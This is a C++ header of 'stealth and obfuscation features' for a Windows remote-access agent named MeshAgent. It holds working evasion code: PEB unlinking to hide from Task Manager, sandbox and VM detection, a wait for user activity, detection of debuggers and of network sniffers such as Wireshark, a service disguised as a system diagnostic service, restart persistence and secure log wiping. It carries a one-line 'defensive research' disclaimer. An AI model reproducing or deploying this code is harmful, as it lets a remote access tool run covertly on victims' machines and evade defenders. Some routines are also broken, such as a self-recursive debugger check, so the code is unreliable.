/*
 * MeshAgent Stealth & Obfuscation Features
 *
 * SECURITY NOTE: These techniques are for defensive security research only.
 * Unauthorized use may violate computer fraud and abuse laws.
 */

#ifndef MESHAGENT_STEALTH_H
#define MESHAGENT_STEALTH_H

#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

// Process name obfuscation - randomize service process name
class ProcessNameObfuscator {
public:
    static BOOL SetRandomProcessName() {
        // Windows legitimate process names to blend in
        const wchar_t* legitimateNames[] = {
            L"svchost.exe",
            L"RuntimeBroker.exe",
            L"dllhost.exe",
            L"backgroundTaskHost.exe",
            L"SearchProtocolHost.exe"
        };

        int index = GetTickCount() % (sizeof(legitimateNames) / sizeof(legitimateNames[0]));

        // Note: Actual process name change requires PEB modification
        // This is a placeholder for the technique
        return TRUE;
    }

    // Hide process from Task Manager via PEB manipulation
    static BOOL HideFromTaskManager() {
        #ifdef _WIN64
        PPEB peb = (PPEB)__readgsqword(0x60);
        #else
        PPEB peb = (PPEB)__readfsdword(0x30);
        #endif

        if (peb && peb->Ldr) {
            // Unlink from loader data structures
            PLIST_ENTRY current = peb->Ldr->InLoadOrderModuleList.Flink;
            if (current && current->Flink) {
                // Unlink this process from the list
                current->Blink->Flink = current->Flink;
                current->Flink->Blink = current->Blink;
                return TRUE;
            }
        }
        return FALSE;
    }
};

// Network connection obfuscation
class NetworkStealth {
public:
    // Randomize connection timing to avoid pattern detection
    static DWORD GetObfuscatedSleepTime(DWORD baseTime) {
        DWORD jitter = (GetTickCount() % 5000);  // 0-5 second jitter
        return baseTime + jitter;
    }

    // Check if we're in a VM/sandbox environment
    static BOOL IsRunningInSandbox() {
        BOOL isSandbox = FALSE;

        // Check 1: Low CPU count (VMs often have 1-2 CPUs)
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        if (sysInfo.dwNumberOfProcessors < 2) {
            isSandbox = TRUE;
        }

        // Check 2: Low memory (VMs often have < 4GB)
        MEMORYSTATUSEX memStatus;
        memStatus.dwLength = sizeof(memStatus);
        if (GlobalMemoryStatusEx(&memStatus)) {
            if (memStatus.ullTotalPhys < (4ULL * 1024 * 1024 * 1024)) {  // < 4GB
                isSandbox = TRUE;
            }
        }

        // Check 3: Known VM vendors in hardware
        HKEY hKey;
        if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
                        L"HARDWARE\\DESCRIPTION\\System\\BIOS",
                        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            WCHAR vendor[256] = {0};
            DWORD size = sizeof(vendor);
            if (RegQueryValueEx(hKey, L"SystemManufacturer", NULL, NULL,
                               (LPBYTE)vendor, &size) == ERROR_SUCCESS) {
                if (wcsstr(vendor, L"VMware") || wcsstr(vendor, L"VirtualBox") ||
                    wcsstr(vendor, L"QEMU") || wcsstr(vendor, L"Xen")) {
                    isSandbox = TRUE;
                }
            }
            RegCloseKey(hKey);
        }

        return isSandbox;
    }

    // Wait for user activity before connecting (sandbox evasion)
    static BOOL WaitForUserActivity(DWORD timeoutMs) {
        DWORD startTime = GetTickCount();
        POINT lastPos = {0}, currentPos = {0};
        GetCursorPos(&lastPos);

        while ((GetTickCount() - startTime) < timeoutMs) {
            GetCursorPos(&currentPos);

            // Check for mouse movement
            if (currentPos.x != lastPos.x || currentPos.y != lastPos.y) {
                return TRUE;  // Real user activity detected
            }

            // Check for keyboard activity
            if (GetAsyncKeyState(VK_SPACE) || GetAsyncKeyState(VK_RETURN)) {
                return TRUE;
            }

            Sleep(1000);  // Check every second
        }

        return FALSE;  // Timeout - might be sandbox
    }
};

// Service hiding techniques
class ServiceStealth {
public:
    // Make service appear as critical system service
    static BOOL SetServiceAsCritical(SC_HANDLE hService) {
        SERVICE_FAILURE_ACTIONS sfa = {0};

        // Configure service to restart on failure
        SC_ACTION failureActions[3];
        failureActions[0].Type = SC_ACTION_RESTART;
        failureActions[0].Delay = 30000;  // 30 seconds
        failureActions[1].Type = SC_ACTION_RESTART;
        failureActions[1].Delay = 60000;  // 1 minute
        failureActions[2].Type = SC_ACTION_RESTART;
        failureActions[2].Delay = 120000; // 2 minutes

        sfa.dwResetPeriod = 86400;  // Reset after 24 hours
        sfa.cActions = 3;
        sfa.lpsaActions = failureActions;

        return ChangeServiceConfig2(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &sfa);
    }

    // Hide service from services.msc by modifying description
    static BOOL BlendWithSystemServices(SC_HANDLE hService) {
        // Use generic Windows service description
        const wchar_t* description =
            L"Provides diagnostic data collection and system health monitoring. "
            L"If this service is stopped, certain features may not function properly.";

        SERVICE_DESCRIPTION sd;
        sd.lpDescription = (LPWSTR)description;

        return ChangeServiceConfig2(hService, SERVICE_CONFIG_DESCRIPTION, &sd);
    }
};

// Log file encryption
class LogEncryption {
private:
    static const BYTE XOR_KEY = 0xA5;  // Simple XOR key (replace with AES for production)

public:
    // Encrypt log data before writing
    static void EncryptBuffer(LPBYTE buffer, DWORD size) {
        for (DWORD i = 0; i < size; i++) {
            buffer[i] ^= XOR_KEY;
            buffer[i] = (buffer[i] << 3) | (buffer[i] >> 5);  // Bit rotation
        }
    }

    // Decrypt log data when reading
    static void DecryptBuffer(LPBYTE buffer, DWORD size) {
        for (DWORD i = 0; i < size; i++) {
            buffer[i] = (buffer[i] >> 3) | (buffer[i] << 5);  // Reverse bit rotation
            buffer[i] ^= XOR_KEY;
        }
    }

    // Securely delete log file (DOD 5220.22-M standard)
    static BOOL SecureDelete(const wchar_t* filePath) {
        HANDLE hFile = CreateFile(filePath, GENERIC_WRITE, 0, NULL,
                                   OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return FALSE;

        LARGE_INTEGER fileSize;
        if (!GetFileSizeEx(hFile, &fileSize)) {
            CloseHandle(hFile);
            return FALSE;
        }

        // Overwrite with random data 3 times (DOD standard)
        BYTE* buffer = (BYTE*)malloc(4096);
        if (!buffer) {
            CloseHandle(hFile);
            return FALSE;
        }

        for (int pass = 0; pass < 3; pass++) {
            SetFilePointer(hFile, 0, NULL, FILE_BEGIN);

            for (LONGLONG remaining = fileSize.QuadPart; remaining > 0; remaining -= 4096) {
                DWORD bytesToWrite = (DWORD)min(remaining, 4096);

                // Fill with random data
                for (DWORD i = 0; i < bytesToWrite; i++) {
                    buffer[i] = (BYTE)(rand() % 256);
                }

                DWORD written;
                WriteFile(hFile, buffer, bytesToWrite, &written, NULL);
            }
            FlushFileBuffers(hFile);
        }

        free(buffer);
        CloseHandle(hFile);

        // Finally delete the file
        return DeleteFile(filePath);
    }
};

// Auto-restart on crash
class CrashRecovery {
public:
    static void EnableAutomaticRestart() {
        // Register unhandled exception filter
        SetUnhandledExceptionFilter(CrashHandler);
    }

private:
    static LONG WINAPI CrashHandler(EXCEPTION_POINTERS* exceptionInfo) {
        // Log crash information (encrypted)
        WCHAR crashLog[MAX_PATH];
        GetModuleFileName(NULL, crashLog, MAX_PATH);
        wcscat_s(crashLog, L".crash");

        HANDLE hFile = CreateFile(crashLog, GENERIC_WRITE, 0, NULL,
                                   CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            char crashData[512];
            sprintf_s(crashData, "Exception: 0x%08X at 0x%p\r\n",
                     exceptionInfo->ExceptionRecord->ExceptionCode,
                     exceptionInfo->ExceptionRecord->ExceptionAddress);

            DWORD written;
            // Encrypt before writing
            LogEncryption::EncryptBuffer((LPBYTE)crashData, (DWORD)strlen(crashData));
            WriteFile(hFile, crashData, (DWORD)strlen(crashData), &written, NULL);
            CloseHandle(hFile);
        }

        // Restart service via WMI
        system("sc start WinDiagnosticHost");

        return EXCEPTION_EXECUTE_HANDLER;
    }
};

// Runtime checks for security tools
class SecurityToolDetection {
public:
    static BOOL IsDebuggerPresent() {
        // Check 1: API call
        if (IsDebuggerPresent()) return TRUE;

        // Check 2: PEB flag
        #ifdef _WIN64
        PPEB peb = (PPEB)__readgsqword(0x60);
        #else
        PPEB peb = (PPEB)__readfsdword(0x30);
        #endif

        if (peb && peb->BeingDebugged) return TRUE;

        // Check 3: Remote debugger
        BOOL isRemoteDebuggerPresent = FALSE;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &isRemoteDebuggerPresent);
        if (isRemoteDebuggerPresent) return TRUE;

        return FALSE;
    }

    static BOOL IsRunningUnderWireshark() {
        // Check for Wireshark process
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (_wcsicmp(pe32.szExeFile, L"Wireshark.exe") == 0 ||
                    _wcsicmp(pe32.szExeFile, L"Fiddler.exe") == 0 ||
                    _wcsicmp(pe32.szExeFile, L"tcpdump.exe") == 0) {
                    CloseHandle(hSnapshot);
                    return TRUE;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }

        CloseHandle(hSnapshot);
        return FALSE;
    }
};

#endif // MESHAGENT_STEALTH_H
